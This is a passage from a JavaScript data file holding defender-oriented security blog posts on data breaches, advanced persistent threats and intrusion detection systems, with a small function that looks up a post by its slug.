        "A data breach is a security incident in which sensitive, protected or confidential information is accessed, copied, transmitted, viewed, stolen or used by an unauthorised individual. It doesn't require malicious intent — a lost laptop is a breach.",
        "What counts as 'sensitive' varies by jurisdiction: personal data (GDPR), protected health information (HIPAA), cardholder data (PCI-DSS), financial data (GLBA). Know your applicable regulations before an incident, not during.",
      ]},
      { heading: "The five common causes", list: [
        { t: "Compromised credentials", d: "Stolen or reused passwords, phishing, credential stuffing. The #1 cause year after year." },
        { t: "Unpatched vulnerabilities", d: "Public-facing services with known CVEs — always in the top three." },
        { t: "Insider action", d: "Malicious (theft) or accidental (misconfigured share, wrong recipient). Both count." },
        { t: "Third-party / supply-chain", d: "You're only as strong as your least secure vendor. Every major breach of the past five years has had a supply-chain angle." },
        { t: "Lost or stolen device", d: "Physical assets containing unencrypted data. Preventable with full-disk encryption." },
      ]},
      { heading: "Warning signs before the boom", list: [
        { t: "Anomalous outbound data", d: "Sudden spikes in outbound traffic to unusual destinations." },
        { t: "New privileged accounts", d: "Especially outside change windows." },
        { t: "Unusual login patterns", d: "Impossible travel, off-hours sign-ins, sign-ins from Tor / VPN exit nodes." },
        { t: "Disabled security controls", d: "AV service stopped, logging disabled, EDR uninstalled — someone doesn't want to be seen." },
        { t: "Ransom notes on public data-leak sites", d: "Sometimes you learn from a criminal's website before your own tools." },
      ]},
      { heading: "The response playbook (72 hours)", list: [
        { t: "T+0 – T+2h: Contain", d: "Isolate affected systems, revoke credentials, block C2 infrastructure." },
        { t: "T+2h – T+8h: Assess scope", d: "What data types, how many records, which subjects. Legal engagement starts here." },
        { t: "T+8h – T+24h: Eradicate", d: "Remove attacker footholds, rotate all potentially exposed secrets, patch the initial vector." },
        { t: "T+24h – T+72h: Notify", d: "Regulators (GDPR 72h, HIPAA 60d, SEC 4d for material). Affected individuals per jurisdictional rules." },
        { t: "T+72h+: Recover and learn", d: "Restore services, monitor for re-emergence, publish an honest post-incident summary." },
      ]},
      { heading: "The real cost", body: [
        "Regulatory fines are the visible cost. Legal fees, forensics, customer notifications, credit monitoring, business disruption, brand damage and lost customer trust are collectively 3–5× larger. Preparation is always cheaper.",
      ]},
    ],
  },
  {
    slug: "advanced-persistent-threats",
    title: "Advanced Persistent Threats: Full Guide for the SOC Team",
    category: "APT Deep Dive",
    excerpt: "APTs are not your average cyberattack — they don't smash and grab; they infiltrate, lurk, and operate on timelines measured in months. A lifecycle-based defender's guide.",
    date: "Apr 13, 2026",
    read_mins: 11,
    image: IMG("1544197150-b99a580bb7a8"),
    sections: [
      { heading: "What makes an APT different", body: [
        "APT stands for Advanced Persistent Threat — a well-resourced, patient adversary (usually state-sponsored or a large criminal syndicate) that maintains long-term access to a specific target to achieve strategic objectives like espionage, intellectual property theft, or prepositioning for future disruption.",
        "The three words matter. Advanced: custom tooling, zero-days, or exquisite operational security. Persistent: dwell times measured in months, sometimes years. Threat: intent driven by a mission, not opportunity.",
      ]},
      { heading: "The 8-phase APT lifecycle", list: [
        { t: "1. Reconnaissance", d: "Passive OSINT + active enumeration. LinkedIn, DNS, breach dumps, supply-chain mapping." },
        { t: "2. Initial access", d: "Spear-phish, watering hole, exploit of internet-facing service, supply-chain implant. Cheap and quiet." },
        { t: "3. Establish foothold", d: "Small implant that survives reboot; beacons out to C2 at low frequency." },
        { t: "4. Privilege escalation", d: "Local admin → domain admin. Kerberoasting, LSASS dumping, service account abuse." },
        { t: "5. Internal reconnaissance", d: "Map AD, identify crown-jewel systems, locate data owners. Uses native tools — nltest, whoami, PowerView." },
        { t: "6. Lateral movement", d: "Host-to-host via stolen credentials or PtH/PtT. WMI, WinRM, RDP, SMB." },
        { t: "7. Maintain presence", d: "Multiple persistence mechanisms — services, scheduled tasks, registry Run keys, WMI event subscriptions, GPO backdoors." },
        { t: "8. Complete mission", d: "Exfiltrate, disrupt, or lie dormant. Cleanup follows." },
      ]},
      { heading: "Named groups you should know", list: [
        { t: "APT28 / FANCY BEAR", d: "Russian GRU. Election interference, defence targeting." },
        { t: "APT29 / COZY BEAR", d: "Russian SVR. Behind SolarWinds / SUNBURST." },
        { t: "APT41 / WICKED PANDA", d: "Chinese. Rare hybrid of espionage and financial motive." },
        { t: "LAZARUS", d: "North Korean. Bangladesh Bank heist, crypto exchange attacks." },
        { t: "Volt Typhoon", d: "China-linked. Pre-positioning inside US critical infrastructure via living-off-the-land." },
      ]},
      { heading: "Detection: assume they're already inside", list: [
        { t: "Baseline behavioural telemetry", d: "PowerShell, WMI, lateral-movement patterns. Anomalies stand out only against a good baseline." },
        { t: "Identity is the choke point", d: "Most APTs escalate via credentials. Kerberoasting alerts, unusual TGS requests, and privileged-account anomalies are gold." },
        { t: "Long-tail beaconing", d: "APTs beacon slowly — hourly, daily. Look for low-and-slow patterns to rare destinations, especially with high jitter." },
        { t: "Threat intel integration", d: "Continuously ingest known-APT IOCs (host artefacts, C2 domains, TLS certs). Retroactively hunt as new intel arrives." },
      ]},
      { heading: "The uncomfortable metric: dwell time", body: [
        "Industry average dwell time is still measured in weeks. If your organisation's answer to 'how long could an APT persist here undetected?' is 'we don't know', that's the number to attack. Threat hunting, purple-teaming and assumed-breach exercises are the tools.",
      ]},
    ],
  },
  {
    slug: "intrusion-detection-system",
    title: "What is an Intrusion Detection System (IDS)? A Complete Explainer",
    category: "Fundamentals",
    excerpt: "An IDS monitors network traffic or host activity for signs of malicious behavior. Architecture, deployment modes, and how modern SOCs actually operationalize them.",
    date: "Apr 12, 2026",
    read_mins: 7,
    image: IMG("1558494949-ef010cbdcc31"),
    sections: [
      { heading: "Definition", body: [
        "An Intrusion Detection System is a security tool that monitors network traffic or host activity for signs of malicious behaviour, policy violations or reconnaissance activity, and alerts defenders when something matches its rules or model. Unlike an IPS (Intrusion Prevention System), an IDS observes and alerts — it does not block.",
      ]},
      { heading: "The two families", list: [
        { t: "Network IDS (NIDS)", d: "Sits on a network span/tap, inspects packet payloads and flows. Examples: Suricata, Snort, Zeek. Ideal for east-west and egress traffic monitoring." },
        { t: "Host IDS (HIDS)", d: "Runs on the endpoint, inspects OS calls, file changes, log events. Examples: Wazuh, OSSEC, EDR agents. Ideal for detecting local exploitation and lateral movement." },
      ]},
      { heading: "Detection approaches", list: [
        { t: "Signature-based", d: "Known-bad patterns (regex, byte sequences). Fast, low false-positive on known threats — blind to novel ones." },
        { t: "Anomaly-based", d: "Baselines normal behaviour statistically, alerts on deviations. Catches novel threats but noisier — tuning is critical." },
        { t: "Behavioural / heuristic", d: "Rules that describe how a threat behaves (e.g., 'PowerShell child of Word document') rather than what it is. Sits between signature and anomaly." },
      ]},
      { heading: "Operationalising an IDS", list: [
        { t: "Feed it into your SIEM", d: "An IDS in isolation is a screaming pager. In context of endpoint, identity and cloud telemetry, its alerts become actionable." },
        { t: "Enrich alerts automatically", d: "IP reputation, hostname, asset criticality, user identity — done at ingest, not by the analyst." },
        { t: "Tune ruthlessly", d: "The default ruleset is a starting point, not a finished product. Retire or retune every rule with a < 20% true-positive rate." },
        { t: "Detection engineering", d: "Treat IDS rules as code — version-controlled, tested, reviewed. Sigma is the emerging standard for portable rules." },
      ]},
      { heading: "Where IDS fits in the modern SOC", body: [
        "IDS is one of several telemetry streams; on its own it's rarely sufficient. But paired with EDR, identity logs, cloud logs and threat intel, it delivers the network layer of the visibility puzzle. The best SOCs write custom rules for their environment — because generic rules find generic threats, and targeted ones find you.",
      ]},
    ],
  },
];

export function findBlogPost(slug) {
  return BLOG_POSTS.find((p) => p.slug === slug);
}
